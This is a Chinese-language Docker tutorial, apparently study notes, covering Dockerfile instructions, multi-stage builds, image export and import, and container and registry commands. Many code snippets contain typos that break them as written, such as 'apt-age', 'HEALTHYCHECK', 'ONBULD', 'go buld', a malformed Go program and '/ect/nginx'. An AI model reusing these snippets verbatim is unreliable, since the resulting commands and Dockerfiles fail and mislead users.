对于容器而言，其启动程序就是容器应用进程，容器就是为了主进程而存在的，主进程退出，容器就是去了生存的意义，从而退出，其他辅助进程不是它需要关心的东西。 而是用 service nginx start命令，则是希望upstart来以后台守护进程形式启动nginx，CMD service nginx start实际上是 CMD[&quot;sh&quot;,&quot;-C&quot;,&quot;service nginx start&quot;]，因此主进程实际上是sh,当 service nginx start命令结束后，sh也就结束了，sh作为主进程退出，自然容器退出。 正确的做法是直接执行nginx可执行文件，并且要求前台形式运行： CMD [“nginx”,”-g”,”daemon off”;] ENTRYPOINT入口点与RUN指令一样，分为exec和shell格式。目的和CMD一样，都是在指定容器启动程序及参数。ENTRYPOINT在运行时也可以替代，不过比CMD要略繁琐，需要通过 docker run –entrypoint指定。 指定ENTRYPOINT后，CMD的含义就发生了变化，不再是直接的运行其命令，而是将CMD的内容作为参数传给ENTRYPOINT指令： ““ 有了CMD后，为什么还要有ENTRYPOINT? 场景一：让镜像变成像命令一样使用假设我们需要一个得知自己当前公网IP的镜像，可以使用CMD实现 12345FROM ubuntu:16.04RUN apt-age update \ &amp;&amp; apt-age install -y curl \ &amp;&amp; rm -rf /var/lib/apt/lists/*CMD ["curl","-s","http://ipinfo.cn"] 使用 docker build -t myip .来构建镜像的话，如果查询当前公网的ip，只需要执行 1docker run myip 现在把镜像当做命令使用，如果命令有参数要怎么加上？CMD中实际的命令是curl，如果希望展示HTTP头部信息，就需要加上 -i参数 12docker run myip -idocker: Error response from daemon: invalid header field value "oci runtime error: container_linux.go:247: starting container process caused \"exec: \\\"-i\\\": executable file not found in $PATH\"\n". 可以看到执行文件找不到的报错，executable file not found。在镜像后面的是 command，运行时会替换CMD的默认值，这里的-i替换了CMD,而不是加在 curl -s http://ip.cn后面。而 -i不是命令，所以自然找不到。 如果希望加入 -i这参数，就必须重新完整的输入这个命令 1docker run myip curl -s http://ipinfo.cn -i 这显然不是很好的解决方案，使用ENTRYPOINT可以解决这个问题： 12345FROM ubuntu:16.04RUN apt-get update \ &amp;&amp; apt-get install -y curl \ &amp;&amp; rm -rf /var/lib/apt/lists/*ENTRYPOINT ["curl","-s","http://ipinfo.cn"] 运行 docker run myip -i 1234567891011121314151617181920212223242526272829303132333435docker@default:~/myip$ docker run myip&#123; "ip": "113.70.180.56", "city": "Foshan", "region": "Guangdong", "country": "CN", "loc": "23.0268,113.1315", "org": "AS4134 CHINANET-BACKBONE", "timezone": "Asia/Shanghai", "readme": "https://ipinfo.io/missingauth"&#125;docker@default:~/myip$ docker run myip -iHTTP/1.1 200 OKDate: Thu, 09 Jul 2020 03:16:44 GMTContent-Type: application/json; charset=utf-8Content-Length: 233Vary: Accept-EncodingAccess-Control-Allow-Origin: *X-Frame-Options: DENYX-XSS-Protection: 1; mode=blockX-Content-Type-Options: nosniffReferrer-Policy: strict-origin-when-cross-originSet-Cookie: flash=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMTVia: 1.1 googleExpires: Thu, 09 Jul 2020 03:16:44 GMTCache-Control: private&#123; "ip": "113.70.180.56", "city": "Foshan", "region": "Guangdong", "country": "CN", "loc": "23.0268,113.1315", "org": "AS4134 CHINANET-BACKBONE", "timezone": "Asia/Shanghai", "readme": "https://ipinfo.io/missingauth" 当存在ENTRYPOINT后，CMD的内容将会作为参数传给ENTRYPOINT,而 -i就是新的CMD,因此会作为参数传给curl。 场景二：应用运行前的准备工作启动容器就是启动主进程，有时候在启动主进程前，需要一些准备工作。 例如mysql类的数据库，需要一些数据库配置、初始化工作，这些工作要在mysql服务器运行前解决。 另外，希望避免使用root用户去启动服务，从而提高安全性，而在启动前还需要以root身份执行一些必要的准备工作，最后切换到服务用户身份启动服务。或者除了服务外，其他命令依旧可以使用root身份执行，方便调试。 这些准备工作与容器CMD无关的，无论CMD为什么，都需要事先进行一个预处理的工作，这种情况可以写一个脚本，放入到ENTRYPOINT中去执行，而这个脚本也会将接收到的参数也就是CMD的命令作为命令，在脚本最后执行，官方镜像redis就是这样做的 12345678FROM alpine:3.4...RUN addgroup -S redis &amp;&amp; adduser -S -G redis redis...ENTRYPOINT ["docker-entrypoint.sh"]EXPOSE 6379CMD ["redis-server"] 可以看到为了redis服务创建redis用户，并在最后指定了ENTRYPOINT为docker-entrypoint.sh脚本 123456789# !/bin/sh..# allow the container to be started with '--user'if ["$1"='redis-server' -a "$(id-u)"='0'];then chown -R redis . exec su-exec redis "$0" "$@"fiexec "$@" 脚本的内容根据CMD的内容来判断如果是redis-server就切换到redis用户身份去启动服务器，否则使用root身份执行 12docker run -it redis iduid=0(root) git=0(root) groups=0(root) ENV设置环境变量格式： ENV&lt;key&gt;&lt;value&gt; ENV&lt;key1&gt;=&lt;value&gt; &lt;key2&gt;=&lt;value2&gt; 设置环境变量，无论是后面的其他指令RUN，还是运行时的引用，都可以直接使用这里定义的环境变量 123ENV VERSION=1.0 DEBUG=on \ NAME="Happy Feet"# 换行符以及当有空格的值用双引号括起来 定义了环境变量，在后续的指令里面就可以使用这个环境变量，比如官方node镜像Dockerfile中妈就有类似这样的代码 12345678ENV NODE_VERSION 7.2.0RUN curl -SLO "https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz" \ &amp;&amp; curl -SLO "https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc" \ &amp;&amp; gpg --batch --decrypt --output SHASUMS256.txt SHASUMS256.txt.asc \ &amp;&amp; grep " node-v$NODE_VERSION-linux-x64.tar.xz\$" SHASUMS256.txt | sha256sum -c - \ &amp;&amp; tar -xJf "node-v$NODE_VERSION-linux-x64.tar.xz" -C /usr/local --strip-components=1 \ &amp;&amp; rm "node-v$NODE_VERSION-linux-x64.tar.xz" SHASUMS256.txt.asc SHASUMS256.txt \ &amp;&amp; ln -s /usr/local/bin/node /usr/local/bin/nodejs 定义了NODE_VERSION环境变量，其后RUN这层，多次使用$NODE_VERSION来进行操作定制。可以看到，升级镜像构建版本的时候，只要更新7.2.0既可，构建维护变得更轻松了 下列的指令可以支持环境变量展开： ADD/COPY/ENV/EXPOSE/LABEL/USER/WORKDIR/VOLUME/STOPSIGNAL/ONBUILD ARG构建参数格式：ARG&lt;参数名&gt;[=&lt;默认值&gt;] 构建参数和ENV的效果一样，都是设置环境变量，不同的是，ARG所设置的构建环境的环境变量，在将来容器运行时是不会存在这些环境变量的。但是不要因此就使用ARG保存密码之类的信息，因为docker history还是可以看到所有值的。 Dockerfile中ARG指令是定义参数名称，以及定义其默认值。该默认值可以在构建命令docker build中用 --build-arg&lt;参数名&gt;=&lt;值&gt;来覆盖。 在1.13之前的版本，要求 --build-arg中的参数名，必须在Dockerfile中用ARG定义过了，如果没有则会报错退出构建。在1.13之后的版本，只是显示警告信息，并继续构建。这对于使用CI系统，用同样的构建流程构建不同的Dockerfile的时候比较有帮助，避免构建命令必须根据每个Dockerfile的内容修改 VOLUME定义匿名卷格式为： VOLUME[&quot;&lt;路径1&gt;&quot;,&quot;路径2&quot;...] VOLUME&lt;路径&gt; 容器运行时应该尽量保持容器存储层不发生写操作，对于数据库需要保存动态数据的应用，其数据库文件应该保存于卷中，为了防止运行时用户忘记将动态文件所保存目录挂载为卷，在Dockerfile中，我们实现指定某些目录挂载为匿名卷，这样在运行时如果用户不指定挂载，其应用也可以正常运行，不会向容器存储层写入大量数据 VOLUME /data 这里的 /data目录就会在运行时自动挂载为匿名卷，任何向 /data中写入的信息都不会记录进容器存储层，从而保证了容器存储层的无状态化。运行时也可以覆盖这个挂载设置： docker run -d -v mydata:/data xxx 使用了 mydata这个命令卷挂载到了 /data这个位置，替代了Dockerfile中定义的匿名卷的挂载配置 EXPOSE声明端口格式为：EXPOSE&lt;端口1&gt;[&lt;端口2&gt;...] EXPOSE指令是声明运行时容器提供服务端口，在运行时并不会因为这个声明应用就会开启这个端口的服务，在Dockerfile中写入这样的声明有两个好处，一个是帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射；另一个好处就是运行时使用随机端口映射时，也就是docker run -P时，会自动随机映射EXPOSE端口 在早期Docker版本中还有一个特殊用处，以前所有的容器都是运行于默认桥接网络中，因此所有容器互相之间都可以直接访问，这样存在一定的安全性问题。于是有了一个Docker引擎参数 --icc=false，当指定该参数后，容器间将默认无法互访，除非互相使用了--links参数的容器才可以互通，并且只有镜像中EXPOSE所声明的端口才可以被访问。这个 -icc=false的用法在引入了docker network后已经基本不用了，通过自定义网络可以轻松实现容器间的互联与隔离。 要将 EXPOSE和在运行时使用 -p &lt;宿主端口&gt;:&lt;容器端口&gt;区分开，-p是映射宿主端口和容器端口，也就是将容器的对应端口服务公开给外界访问，而EXPOSE仅仅是声明容器打算使用什么端口而已，并不会自动在宿舍进行映射。 WORKDIR指定工作目录格式：WORKDIR&lt;工作目录路径&gt; 使用WORKDIR指令可以来指定工作目录（或者称为当前目录），以后各层的目录就被改成指定目录，如该目录不存在，WORKDIR就会帮你建立目录 错误例子： RUN cd /app RUN echo “hello” &gt; world.txt 把Dockerfile当做Shell脚本来书写，构建镜像运行后，会发现找不到 /app/world.txt文件，或者其内容不是hello.在shell中，连续两行是同一个进程执行环境，因此前一个命令修改的内存状态，会直接影响下一个命令；而在Dockerfile中，这两行RUN命令的执行环境根本不同，是两个完全不同的容器，这是对Dockerfile构建分层存储的概念不了解所导致的错误。 如果需要改变各层的工作目录位置，应该使用WORKDIR指令 USER指定当前用户格式：USER&lt;用户名&gt; USER指令和WORKDIR相似，都是改变环境并影响以后的层，WORKDIR是改变工作目录，USER则是改变之后层的执行RUN,CMD以及ENTRYPOINT这类命令的身份 和WORKDIR一样，USER只是帮助切换到指定用户而已，这个用户必须是事先建立好的，否则无法切换 123RUN groupadd -r redis &amp;&amp; useradd -r -g redis redisUSER redisRUN ["redis-server"] 如果以root执行的脚本，在执行期间希望改变身份，比如希望以某个已经建立好的用户来运行某个服务进程。不要使用su或者sudo，这些都需要比较麻烦的配置，而且在TTY缺失的环境下经常出错，建议使用 gosu 12345678# 建立 redis用户，并使用 gosu换另一个用户执行命令RUN groupadd -r redis &amp;&amp; useradd -r -g redis redis# 下载 gosuRUN wget -O /usr/local/bin/gosu "http://github.com/tianon/gosu/release/download/1.7/gosu-amd64" \ &amp;&amp; chmod +x /usr/local/bin/gosu \ &amp;&amp; gosu nobody true# 设置CMD,并以另外的用户执行CMD ["exec","gosu","redis","redis-server"] HEALTHCHECK健康检查格式： HEALTHCHECK [选项] CMD &lt;命令&gt;，设置检查容器健康状态的命令 HEALTHCHECK NONE：如果基础镜像有健康检查指令，使用这行可以屏蔽其健康检查指令。 在没有HEALTHCHECK指令前，Docker引擎只可以通过容器内主进程是否退出来判断容器是否状态异常，很多情况下没问题，但是如果程序进入死锁状态，或者死循环，应用程序不会退出，但是该容器已经无法提供服务了。在1.12前，Docker不会检测到容器的这种状态，从而不会重新调度，导致可能会有部分容器已经无法提供服务却还在接受用户请求。 在1.12之后，Docker提供了这个指令，通过改指令指定一行命令，用这行命令来判断容器主进程服务状态是否还正常，从而比较真实的反应容器实际状态。 当在一个镜像指定了HEALTHCHECK指令后，用其启动容器，初始状态为starting，在HEALTHCHECK指令检查成功后变为healthy，如果连续一定次数失败，则会变为unhealthy 支持系列选项： –interval=&lt;间隔&gt;：两次健康检查的间隔，默认为30s –timeout=&lt;时长&gt;：健康检查命令运行超时时间，如果超过这个时间，本次健康检查视为失败，默认30s –retries=&lt;次数&gt;：当连续失败指定次数后，则容器状态为unhealthy，默认3次 和CMD/ENTRYPOINT一样，HEALTHYCHECK只出现一次，如果写了多个，只有最后一个生效。 在HEALTHYCHECK [选项] CMD后面命令，格式和ENTRYPOINT一样，分为shell，和exec。命令的返回值决定了该次健康检查的成功与否：0为成功1是失败，2保留，不要使用这个值 假设我们有个镜像简单的Web服务，希望增加健康检查判断Web服务是否正常工作，用curl判断，dockerfile可以这么写： 1234FROM nginx RUN agt-get update &amp;&amp; apt-get install -y curl &amp;&amp; rm -rf /var/lib/apt/lists/*HEALTHYCHECK --interval=5s --timeout=3s \CMD curl -fs http://localhost/ || exit 1 设置了每5秒检查一次，如果健康检查超过3秒没响应就是视为失败。构建并启动容器 123456789101112131415161718192021docker build -t myweb:v1docker run -d --name web -p 80:80 myweb:v1# 查看状态docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES03e28eb00bd0 myweb:v1 "nginx -g 'daemon off" 3 seconds ago Up 2 seconds (health: starting) 80/tcp, 443/tcp web# 等待几秒后再查看，发现健康状态变成了healthy,如果健康检查连续失败超过重试次数，状态就为unhealthy# 为帮助排障，健康检查命令的输出stdout/stderr等都会被存储在健康状态，可用docker inspect查看docker inspect --format‘&#123;&#123;json .State.Health&#125;&#125;’ web | python -m json.tool&#123; "FailingStreak": 0, "Log": [ &#123; "End": "2016-11-25T14:35:37.940957051Z", "ExitCode": 0, "Output": "&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Welcome to nginx!&lt;/title&gt;\n&lt;style&gt;\n body &#123;\n width: 35em;\n margin: 0 auto;\n font-family: Tahoma, Verdana, Arial, sans-serif;\n &#125;\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;\n&lt;p&gt;If you see this page, the nginx web server is successfully installed and\nworking. Further configuration is required.&lt;/p&gt;\n\n&lt;p&gt;For online documentation and support please refer to\n&lt;a href=\"http://nginx.org/\"&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;\nCommercial support is available at\n&lt;a href=\"http://nginx.com/\"&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;\n\n&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n", "Start": "2016-11-25T14:35:37.780192565Z" &#125; ], "Status": "healthy"&#125; ONBUILD为他人做嫁衣裳格式：ONBUILD&lt;其他指令&gt; ONBUILD是一个特殊的指令，后面跟着的是其他指令，例如RUN/COPY等，而这些指令，在当前镜像构建时不会被执行，只有当以当前镜像为基础，去构建下一个镜像才会执行 Dockerfile中的其他指令都是为了定制当前镜像而准备的，ONBUILD是为了帮助别人定制自己准备的。Nodejs使用npm管理，拿到程序后，一般会先安装依赖，然后启动，一般会这么写Dockerfile 1234567FROM node:slimRUN mkdir /appWORKDIR /appCOPY ./package.json /appRUN ["npm","install"]COPY . /app/CMD ["npm","start"] 把这个Dockerfile放到Nodejs的根目录，构建好镜像后，就可以直接拿来启动容器运行，但是如果有第二个第三个差不多的项目，随着文件附件越多，版本控制就越难。 如果在第一个Nodejs项目发现了Dockerfile存在的问题，比如敲错字，或者需要安装额外的包，然后开发人员修复了这个Docker，再次构建，问题解决。但是其他项目呢？虽然最初Dockerfile是复制、粘贴自第一个项目，但是并不会因为第一个项目修复了Dockerfile就会自动修复 那么我们可以做一个基础镜像，然后各个项目使用这个基础镜像。镜像更新后就不用同步Dockerfile的变化，重新构建后就继续了基础镜像的更新： 1234FROM node:slimRUN mkdir /appWORKDIR /appCMD ["npm","start"] 这里把项目相关的构建指令拿出来，放在子项目去。假设这个基础镜像为my-node，各个项目内的Dockerfile就变成： 1234FROM my-nodeCOPY ./package.json /appRUN ["npm","install"]COPY . /app/ 基础镜像变化后，各个项目都用这个Dockerfile重新构建镜像，会基础基础镜像的更新。 但是问题并没有完全解决，这个Dockerfile如果有东西要修改，又要重新一个一个修改。这样制作镜像只解决了原来Dockerfile的前4条指令的变化问题，而后面三条指令的变化则完全没办法处理 ONBUILD可以解决这个问题： 1234567FROM node:slimRUN mkdir /appWORKDIR /appONBUILD COPY ./package.json /appONBUILD RUN ["npm","install"]ONBULD COPY . /app/CMD ["npm","start"] 在构建镜像的时候，这三行并不会被执行，然后各个项目的Dockerfile就变成 1FROM my-node 当在各个项目目录中，用这个只有一行的Dockerfile构建镜像时，之前基础镜像的那三行ONBUILD就会执行，成功的将当前项目的代码复制进镜像，并且针对本项目进行npm install，生成对应镜像 多阶段构建在17.05之前，构建Docker镜像通常会采用两种方式 全部放入一个Dockerfile一种方式是将所有的构建过程编包含在一个Dockerfile中，包括项目以及依赖库的编译、测试、打包等流程，这里可能会有一些问题： Dockerfile特别长，可维护性降低 镜像层次多，镜像体积较大，部署时间变长 源代码存在泄漏的问题 例如：编写app.go文件，输出Hello World! 12345package mainimport "fmt"function main()&#123; fmt.Printf('Hello World!')&#125; 编写Dockerfile.one文件 12345678910FROM golang:1.9-alpineRUN apk --no-cache add got ca-certificatesWORKDIR /go/src/github.com/go/helloworld/COPY app.go .RUN go get -d -v github.com/go-sql-driver/mysql \ &amp;&amp; CGO_ENABLED=0 GOOS=linux go buld -a -installsuffix cgo -o app . \ &amp;&amp; cp /go/src/github.com/go/helloworld/app/rootWORKDIR /root/CMD ["./app"] 构建镜像 1docker build -t go/helloworld:1 -f Dockerfile.one 分割到多个Dockerfile另一种方式，就是事先在一个Dockerfile将项目以及其依赖库编译测试打包好后，再将其拷贝到运行环境中，这种方式需要编写两个Dockerfile和一些编译脚本才能将两个阶段自动整合起来，这种方式虽然可以很好规避第一种方式存在的风险，但明显部署过程比较复杂 Dockerfile.build文件 123456FROM golang:1.9-alpineRUN apk --no-cache add gitWORKDIR /go/src/github.com/go/helloworldCOPY app.go .RUN go get -d -v github.com/go-sql-driver/mysql \ &amp;&amp; CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app . Dockerfile.copy文件 12345FROM alpine:latestRUN apk --no-cache add ca-certificatesWORKDIR /root/COPY app .CMD ["./app"] 新建build.sh 12345678910111213#!/bin/shecho Building go/helloworld:builddocker build -t go/helloworld:build . -f Dockerfile.builddocker create --name extract go/helloworld:builddocker cp extrace:go/src/github.com/go/helloworld/app ./appdocker rm -f extractecho Building go/helloworld:2docker build --no-cache -t go/helloworld:2 -f Dockerfile.copy rm ./app 运行脚本即可构建镜像 12chmod +x build.sh./build.sh 对比两种生成的镜像大小 12345$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEgo/helloworld 2 f7cf3465432c 22 seconds ago 6.47MBgo/helloworld 1 f55d3e16affc 2 minutes ago 295MB 使用多阶段构建为了解决以上的问题，17.05后开始支持多阶段构建（multistage builds）,使用多阶段构建可以解决上面的问题，并只需要编写一个Dockerfile： 例如： 编写Dockerfile文件： 1234567891011FROM golang:1.9-alpine as builderRUN apk --no-cache add gitWORKDIR /go/src/github.com/go/helloworld/RUN go get -d -v github.com/go-sql-driver/mysqlCOPY app.go .RUN CGO_ENABLED=0 GOOS=linux go build -a installsuffix cgo -o appFROM alpine:latest as prodRUN apk --no-cache add ca-certificatesWORKDIR /root/COPY --from=0 /go/src/github.com/go/helloworld/app .CMD ["./APP"] 构建镜像 1docker build -t go/helloworld:3 . 对比三个镜像 123456$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEgo/helloworld 3 d6911ed9c846 7 seconds ago 6.47MBgo/helloworld 2 f7cf3465432c 22 seconds ago 6.47MBgo/helloworld 1 f55d3e16affc 2 minutes ago 295MB 很明显使用多阶段构建的镜像体积小，同时也解决了上边的问题 只构建一阶段的镜像使用as为某一阶段命令，例如： 1FROM golang:1.9-alpine as builder 只构建builder阶段的镜像，可以在使用 docker build的时候加上--target 1docker build --target builder -t username/imagename:tag . 构建时从其他镜像复制文件上面的例子使用 COPY --from=0 /go/src/github.com/go/helloworld/app .从上一阶段的镜像中复制文件，我们可以复制任意镜像中的文件 1COPY --from=nginx:latest /ect/nginx/nginx.conf /nginx.conf 其他制作镜像的方式从rootfs压缩包导入格式：docker import [选项] &lt;文件&gt;|&lt;URL&gt;|- [&lt;仓库名&gt;[:&lt;标签&gt;]] 压缩包可以是本地文件，远程Web文件，甚至是从标准输入中得出的，压缩包就会在镜像 /目录展开，并直接作为镜像第一层提交 123456# 创建一个OpenVZ的Ubuntu14.04模板的镜像：docker import \ http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64-minimal.tar.gz \ openvz/ubuntu:14.04Downloading from http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64-minimal.tar.gzsha256:f477a6e18e989839d25223f301ef738b69621c4877600ae6467c4e5289822a79B/78.42 MB 这条命令自动下载了 ubuntu-14.04-x86_64-minimal.tar.gz 文件，并且作为根文件系统展开导入，并保存为镜像 openvz/ubuntu:14.04 导入成功后，使用 docker image ls可以看到这个导入的镜像 看到历史会看到描述中有导入的文件链接 123$ docker history openvz/ubuntu:14.04IMAGE CREATED CREATED BY SIZE COMMENTf477a6e18e98 About a minute ago 214.9 MB Imported from http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64-minimal.tar.gz docker save和docker load将镜像保存为一个tar文件，然后传输到另外一个位置，再加载进来。这是在没有Docker Registry的做法，现在已不推荐。镜像迁移直接使用Docker Registry，无论是直接使用Docker Hub还是使用内网私有Registry都可以 保存镜像 docker save将镜像保存为归档文件 1docker save alpine | gzip &gt; alpine-latest.tar.gz 然后将它复制到另外一个机器上，用下面的命令加载镜像： 12docker load -i alpine-latest.tar.gzLoaded image: alpine:latest 结合这两个命令和ssh甚至是pv，利用Linux管道可以写一个命令完成从一个机器将镜像迁移到另外一个机器，并且带进度条的功能： 1docker save &lt;镜像名&gt; | bzip2 | pv |ssh &lt;用户名&gt;@&lt;主机名&gt; 'cat|docker load' 镜像实现的原理Docker镜像是怎么实现增量的修改和维护的？ 每个镜像都由多层次构成，Docker使用Union FS将这些不同层结合到一个镜像中去。 通常Union FS有两个用途，一方面可以实现不借助LVM,RAID将多个disk挂在同一个目录下，另一个更常用的就是讲一个只读的分支和一个可写的分支联合在一起。 操作容器简单来说，容器似乎运行的一个或一组应用，以及它们的运行态环境，虚拟机可以理解为模拟运行的一整套操作系统（提供了运行态环境和其他系统环境）和跑在上面的应用 启动容器启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态（stopped）的容器重新启动。因为Docker的容器很轻级，用户可以随时删除和新建容器。 新建并启动12345# 输出Hello World后终止容器docker run ubuntu:14.04 /bin/echo 'Hello world'# 启动一个bash终端，允许用户进行交互,-t选项让Docker分配一个伪终端pseudo-tty并绑定到容器的标准输入上，-i则让容器的标准输入保持打开。在交互模式下，用户可以通过所创建的终端来输入命令docker run -t -i ubuntu:14.04 /bin/bash 当利用 docker run来创建容器时，Docker在后台运行的标准操作包括： 检查本地是否存在指定的镜像，不存在就从共有仓库下载 利用镜像创建并启动一个容器 分配一个文件系统，并在只读的镜像层外面挂载一层可读层 从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去 从地址池配置一个ip地址给容器 执行用户指定的应用程序 执行完毕后容器被终止 启动已终止的容器docker container start命令可以将一个已经终止的容器启动运行。 容器的核心为所执行的应用程序，所需要的资源都是应用程序运行所必需的，除此之外没有其他资源。可以在伪终端中利用ps或top来查进程信息 守护态运行更多时候，需要让Docker在后台运行而不是直接把执行命令的结果输出在当前宿主机下。可以通过添加 -d参数实现。 不用 -d参数运行容器： 12345docker run ubuntu:17.10 /bin/sh -c "while true;do echo hello world;sleep 1;done"hello worldhello worldhello worldhello world 容器会把输出结果stdout打印到宿主主机上面 如果使用了 -d参数运行容器 12docker run -d ubuntu:17.10 /bin/sh -c "while true;do echo hello world; sleep 1;done"77b2dc01fe0f3f1265df143181e7b9af5e05279a884f4776ee75350ea9d8017a 此时容器会在后台运行并不会把输出结果打印到宿主机上面（输出结果可以用docker logs查看）。 注：容器是否会长久运行，和 docker run 指令的命令有关，和 -d参数无关。 使用 -d参数启动后返回一个唯一的id，可以通过 docker container ls命令来查看容器信息 12345678910docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES77b2dc01fe0f ubuntu:17.10 /bin/sh -c 'while tr 2 minutes ago Up 1 minute agitated_wright# 通过 docker icontainer logis获取容器的输出信息docker container logs[container ID or NEWS]hello worldhello worldhello worldhello world 终止使用 docker container stop 来终止一个运行中的容器 当Docker 容器中指定的应用终结时，容器也会自动终止。上面只启动了一个容器，用户可以通过exit或者ctrl+d来推出终端，所创建的容器立刻终止。 终止状态的容器可以使用 docker containers ls -a命令看到例如： 1234docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESba267838cc1b ubuntu:14.04 "/bin/bash" 30 minutes ago Exited (0) About a minute ago trusting_newton98e5efa7d997 training/webapp:latest "python app.py" About an hour ago Exited (0) 34 minutes ago backstabbing_pike 然后通过 docker run restart命令会让一个运行态的容器终止，然后再重新启动它。 进入容器使用 -d参数时，容器启动后会进入后台。某些时候需要进入容器操作，包括docker attch命令或docker exec命令，推荐使用docker exec attch命令docker attch是Docker自带命令 1234567891011docker run -dit ubuntu243c32535da7d142fb0e6df616a3c3ada0b8ab417937c853a9e1c251f499f550docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES243c32535da7 ubuntu:latest "/bin/bash" 18 seconds ago Up 17 seconds nostalgic_hypatiadocker attach 243croot@243c32535da7:/## 如果从这个stdin中exit，会导致容器的停止 exec命令-i -t参数 docker exec可以跟多个参数 只用 -i参数时，由于没有分配伪终端，界面没有Linux命令符，但命令执行结果仍然可以返回 当 -i/-t参数一起使用时，可以看到Linux命令提示符 12345678910111213141516docker run -dit ubuntu69d137adef7a8a689cbcb059e94da5489d3cddd240ff675c640c8d96e84fe1f6docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES69d137adef7a ubuntu:latest "/bin/bash" 18 seconds ago Up 17 seconds zealous_swirlesdocker exec -i 69d1 bashls binbootdev...docker exec -it 69d1 bashroot@xxx:/# 如果从这个stdin中exit，不会导致容器的停止。这就是为什么推荐使用 docker exec的原因 导出和导入容器导出容器123456docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7691a814370e ubuntu:14.04 "/bin/bash" 36 hours ago Exited (0) 21 hours ago testdocker export 7691a814370e &gt; ubuntn.tar#这样导出容器快照到本地文件 导入容器快照12345678910# docker import 从容器快照文件中再导入为镜像cat ubuntu.tar | docker import - test/ubuntu:v1.0docker image lsREPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZEtest/ubuntu v1.0 9d37a6082e97 About a minute ago 171.3 MB# 指定URL或者某个目录来录入docker import http://example.com/exampleimage.tgz example/imagerepo# 用户既可以使用 docker load 来导入镜像存储文件到本地镜像库，也可以使用 docker import 来导入一个容器快照到本地镜像库。这两者区别在于容器快照文件将丢弃所有历史记录和元数据信息（即保存容器当时的快照状态），而镜像存储文件将保存完整记录，体积也要大，此外，从容器快照文件导入时可以重新制定标签等元数据信息 删除12docker container rm hahahaha 删除一个运行中的容器，可以添加 -f，Docker会发送 SIGKILL信号给容器 清理所有处于终止状态的容器: 1docker container prune 访问仓库仓库Repository是集中存放镜像的地方。 一个容易混淆的概念是注册服务器（Registry）。实际上注册服务器是管理仓库的具体服务器，每个服务器可以有多个仓库，而每个仓库下面可以有多个镜像。从这方面来说，仓库被认为是一个具体的项目或者目录。例如对于 仓库地址dl.dockerpool.com/ubuntu来说，dl.dockerpool.com是注册服务器地址，ubuntu是仓库名。大部分时候并不需要严格区分这两者的概念 Docker HubDocker官方维护了一个公共仓库Docker Hub，大部分需求可以在Docker Hub中直接下载镜像实现 在 https://cloud.docker.com 免费注册一个 Docker 账号，通过docker login命令交互式输入用户名和密码完成在命令行登录，docker logout退出登录。 docker search命令查找官方仓库镜像，利用 docker pull命令将它下载到本地 1234567891011# centos为关键词docker search centosNAME DESCRIPTION STARS OFFICIAL AUTOMATEDcentos The official build of CentOS. 465 [OK]tianon/centos CentOS 5 and 6, created using rinse instea... 28blalor/centos Bare-bones base CentOS 6.5 image 6 [OK]saltstack/centos-6-minimal 6 [OK]tutum/centos-6.4 DEPRECATED. Use tutum/centos:6.4 instead. ... 5 [OK]# 可以看到返回包含关键字的镜像，其中包括镜像名字、描述、收藏数（表示该镜像的受关注程度）、是否官方创建、是否自动创建。官方的镜像说明是官方项目组创建和维护的，automated资源允许用户验证镜像的来源和内容。根据是否官方提供，资源镜像可以分为两种：# 一种是类centor这样的镜像，被称为基础镜像或根镜像。这些基础镜像由Docker公司创建、验证、支持、提供。这样的镜像往往使用单个名词作为名字# 还有一种类型，比如tianon/centos镜像，由Docker用户创建并维护的，往往带有用户名称前缀，可以通过前缀username/来指定某个用户名提供的镜像，比如tianon用户 查找的时候通过 --filter=stars=N参数可以指定仅显示收藏数量为N以上的镜像 推送镜像用户登录后通过docker push推送自己的镜像到Docker Hub。 12345678910111213# username替换为Docker 账户用户名docker tag ubuntu:17.10 username/ubuntu:17.10docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEubuntu 17.10 275d79972a86 6 days ago 94.6MBusername/ubuntu 17.10 275d79972a86 6 days ago 94.6MBdocker push username/ubuntu:17.10docker search usernameNAME DESCRIPTION STARS OFFICIAL AUTOMATEDusername/ubuntu 自动创建Automated Builds功能对于需要经常升级镜像内程序来说，十分方便。 用户创建了镜像，安装了某个软件，如果软件发布新版本则需要手动更新镜像。而自动创建运行用户通过Docker Hub指定一个跟踪网站上的项目，Github/BitBucket等，一旦项目发生新的提交或者创建新的标签，Docker Hub会自动构建镜像并推送到 Docker Hub中 配置自动创建，有几个步骤： 创建并登陆Docker Hub，以及目标网站 在目标网站中连接账户到Docker Hub 在Docker Hub中配置一个自动创建 选取一个目标网站的项目（需含有Dockerfile）和分支 指定Dockerfile的位置，并提交创建 之后可以在Docker Hub的自动创建页面中跟踪每次创建的状态 私有仓库用户可以创建一个本地仓库供私人使用 docker-registry是官方提供的工具，用户构建私有镜像库 安装docker-registry通过官方registry镜像来运行 1docker run -d -p 5000:5000 --restart=always --name registry registry 这将使用官方的registry镜像来启动私有仓库，默认情况下，仓库会被创建在容器的 